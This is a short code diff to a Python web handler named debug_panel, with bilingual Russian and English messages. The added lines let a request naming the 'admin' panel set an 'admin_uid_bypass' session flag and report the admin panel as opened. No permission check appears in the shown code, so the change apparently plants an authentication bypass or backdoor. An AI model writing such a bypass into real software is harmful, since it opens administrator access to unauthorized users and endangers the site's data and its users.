@@ -1423,6 +1423,11 @@ def debug_panel():
         clear_user_session()
         return success_response('Возврат на главную. / Home.')
 
+    if panel == 'admin':
+        session['admin_uid_bypass'] = True
+        session['redirect_to_admin_page'] = True
+        return success_response('Админ-панель открыта. / Admin panel opened.')
+
     return error_response(f'Неизвестная панель: {panel}. / Unknown panel: {panel}.', 400)
 
 
